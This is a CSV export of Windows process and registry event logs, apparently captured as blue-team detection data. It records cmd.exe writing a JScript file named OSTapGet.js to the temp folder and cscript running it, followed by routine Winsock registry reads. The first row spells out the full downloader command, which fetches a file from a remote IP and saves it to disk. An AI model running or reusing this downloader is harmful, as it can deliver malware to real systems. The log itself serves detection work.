Process Name,PID,Operation,Path,Result,Detail,Date & Time,Event Class,Image Path,User,Command Line,TID,Parent PID,Content,LineID,srcEvent
cmd.exe,3616,Process Start,,SUCCESS,"Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows",4/14/2022 10:03:29 PM,Process,C:\Windows\system32\cmd.exe,BLUETEAM\ezk,"cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js",6244,3264,"cmd.exe 3616 Process Start None SUCCESS Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows 4/14/2022 10:03:29 PM Process C:\Windows\system32\cmd.exe BLUETEAM\ezk cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js 6244 3264",1,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1869,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1870,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1000 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1871,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderId,SUCCESS,"Type: REG_BINARY, Length: 16, Data: CE 89 FE 03 6D 76 76 49 B9 C1 BB 9B C4 2C 7B 4D",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderId SUCCESS Type: REG_BINARY, Length: 16, Data: CE 89 FE 03 6D 76 76 49 B9 C1 BB 9B C4 2C 7B 4D 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1872,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\AddressFamily,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\AddressFamily NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1873,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\SupportedNameSpace,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 39",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\SupportedNameSpace SUCCESS Type: REG_DWORD, Length: 4, Data: 39 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1874,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\Enabled,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 1",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\Enabled SUCCESS Type: REG_DWORD, Length: 4, Data: 1 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1875,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\Version,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\Version SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1876,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\StoresServiceClassInfo,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\StoresServiceClassInfo SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1877,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1878,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1879,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000002 SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1880,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64 SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1881,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003,SUCCESS,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003 SUCCESS Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1882,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\LibraryPath,SUCCESS,"Type: REG_SZ, Length: 68, Data: %SystemRoot%\system32\pnrpnsp.dll",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\LibraryPath SUCCESS Type: REG_SZ, Length: 68, Data: %SystemRoot%\system32\pnrpnsp.dll 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1883,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\LibraryPath,SUCCESS,"Type: REG_SZ, Length: 68, Data: %SystemRoot%\system32\pnrpnsp.dll",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\LibraryPath SUCCESS Type: REG_SZ, Length: 68, Data: %SystemRoot%\system32\pnrpnsp.dll 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1884,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString,BUFFER OVERFLOW,Length: 12,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString BUFFER OVERFLOW Length: 12 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1885,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1886,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1887,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString,SUCCESS,"Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\DisplayString SUCCESS Type: REG_SZ, Length: 82, Data: @%SystemRoot%\system32\pnrpnsp.dll,-1001 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1888,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderId,SUCCESS,"Type: REG_BINARY, Length: 16, Data: CD 89 FE 03 6D 76 76 49 B9 C1 BB 9B C4 2C 7B 4D",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderId SUCCESS Type: REG_BINARY, Length: 16, Data: CD 89 FE 03 6D 76 76 49 B9 C1 BB 9B C4 2C 7B 4D 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1889,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\AddressFamily,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\AddressFamily NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1890,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\SupportedNameSpace,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 38",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\SupportedNameSpace SUCCESS Type: REG_DWORD, Length: 4, Data: 38 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1891,522f3f35cd013e63830fa555495a0081_raw_events
